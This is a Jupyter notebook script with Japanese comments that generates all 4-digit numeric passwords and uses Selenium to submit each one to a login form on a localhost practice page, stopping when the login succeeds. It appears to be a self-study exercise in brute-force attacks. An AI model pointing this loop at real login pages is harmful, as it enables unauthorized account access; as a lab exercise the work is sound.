#!/usr/bin/env python
# coding: utf-8

# In[1]:


import time
import getpass
import string
#from itertools import product #bad code
import itertools #for文構成、繰り返し数をカウントするのに必要


# In[2]:


#chars = '1234567890'
chars = string.digits #+ string.ascii_letters
print(chars) #要素を全て並べる
#print(len(chars)) #要素の個数を出力する
size = 4
pw_list = [] #初めに配列を用意しておく
print(len(pw_list)) #配列の中身残すを表示　作った直後なので当然０
print('-----------')
for ch in itertools.product(chars,repeat=size):
    password = ''.join(ch)    
    pw_list.append(password) #for前に用意していた配列に現在の値を追加
    #print(password) #forで回している最中の現在の値を表示
    #time.sleep(0.01) #0.001秒待機　パスワード生成では必要ないかもしれない※ただしパスワード数が少ない場合
    #print(pw_list) #forで回している処理中の配列の中身を表示　for前に配列を作っておくと中に次々に追加される　for後に配列を作るとforで回すたびに配列を作る（作り直す）ので現在回している値しか入らない
print('-----------')
#print(pw_list) #配列の中身を全て表示
#print(len(pw_list)) #配列の中の要素の個数を表示


# In[3]:


from selenium import webdriver
from selenium.webdriver.common.keys import Keys
#自動操作するブラウザを指定、操作するページを指定
#import chromedriver_binary #chromedriverについて　URL参照("https://qiita.com/memakura/items/20a02161fa7e18d8a693")
# Chrome のオプションを設定する
options = webdriver.ChromeOptions()
options.add_argument('--headless')
driver = webdriver.Chrome("/usr/local/bin/chromedriver")

driver.get('http://localhost:8888/passwordrock/index.php')


# In[ ]:


#ブルートフォースアタック　作成したパスワード入りの配列からfor文を使って全パターン入力
for pw in pw_list:
    if not driver.current_url == "http://localhost:8888/passwordrock/index.php":
        break
    time.sleep(0.01)
    password = driver.find_element_by_name("password")
    submit = driver.find_element_by_name("submit")
    password.send_keys(pw)
    submit.click()
    print(pw)


# In[ ]:




